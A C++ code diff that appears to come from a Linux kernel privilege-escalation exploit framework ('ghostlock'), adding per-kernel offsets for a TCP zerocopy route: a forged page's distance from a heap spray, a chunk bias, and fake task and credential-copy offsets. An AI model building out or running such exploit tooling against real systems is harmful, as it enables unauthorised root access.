@@ -133,6 +133,14 @@ namespace ghostlock::profile {
         std::optional<uint32_t> mcast_buffer_size;
         std::optional<uint32_t> mcast_task_offset;
         std::optional<uint32_t> mcast_lock_offset;
+        /* TCP zerocopy payload placement. Required for the tcp route (presence
+         * is enforced, never defaulted): the forged page's offset relative to
+         * the spray base, the per-ORDER3 chunk bias, and the in-page task/cred
+         * offsets. These are per-kernel geometry, not compile-time constants. */
+        std::optional<int64_t> tcp_payload_delta;
+        std::optional<uint64_t> tcp_chunk_bias;
+        std::optional<uint64_t> tcp_fake_task_off;
+        std::optional<uint64_t> tcp_cred_copy_off;
     };
 
     /* Multicast route poison/walk repetition; 0 keeps the route default. Values
@@ -185,6 +193,10 @@ namespace ghostlock::profile {
 
     struct TcpZerocopyLayout {
         std::optional<uint8_t> compact_waiter;
+        std::optional<int64_t> payload_delta;
+        std::optional<uint64_t> chunk_bias;
+        std::optional<uint64_t> fake_task_off;
+        std::optional<uint64_t> cred_copy_off;
     };
 
 
@@ -345,7 +357,12 @@ namespace ghostlock::profile {
         }
 
         [[nodiscard]] TcpZerocopyLayout tcp_zerocopy_layout() const noexcept {
-            return (TcpZerocopyLayout){.compact_waiter = values_.misc.compact_waiter};
+            return (TcpZerocopyLayout){
+                    .compact_waiter = values_.misc.compact_waiter,
+                    .payload_delta = values_.geometry.tcp_payload_delta,
+                    .chunk_bias = values_.geometry.tcp_chunk_bias,
+                    .fake_task_off = values_.geometry.tcp_fake_task_off,
+                    .cred_copy_off = values_.geometry.tcp_cred_copy_off};
         }
 
         [[nodiscard]] uint32_t or_default(uint32_t value, uint32_t fallback)
